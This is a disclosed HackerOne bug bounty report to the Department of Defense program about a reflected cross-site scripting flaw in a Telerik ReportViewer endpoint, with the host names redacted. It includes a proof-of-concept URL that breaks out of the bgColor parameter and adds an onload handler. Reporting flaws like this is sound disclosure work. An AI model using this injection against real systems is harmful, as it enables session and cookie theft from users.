# XSS Reflected - ███

## Report Details
- **Report ID**: 1223575
- **URL**: https://hackerone.com/reports/1223575
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-11T04:11:34.303Z
- **Disclosed**: 2022-04-07T19:50:53.134Z

## Reporter
- **Username**: drauschkolb
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi Team,

I found a XSS Reflected.

```
https://██████/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)
```

Thans DRauschkolb

## Impact

XSS vulnerabilities can be used to trick a web user into executing a malicious script, potentially revealing a user's web session information or modify web content & even steal cookies.

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
https://█████/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
